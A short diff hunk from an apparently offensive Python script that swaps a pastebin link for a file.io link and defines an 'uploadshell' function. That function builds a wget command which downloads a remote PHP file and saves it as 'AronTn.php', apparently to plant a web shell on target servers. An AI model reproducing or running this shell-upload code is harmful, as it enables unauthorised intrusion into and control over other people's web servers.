@@ -16,7 +16,7 @@ if platform == "linux" or platform == "linux2":
 elif platform == "win32":
  os.system('cls')
 t = []
-linko = "https://pastebin.com/raw/EiKvkrJp"
+linko = "https://file.io/Yjf56gFLoYYr"
 headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
 def uploadshell(i):
  m = 'wget ' + linko + ' -O AronTn.php'
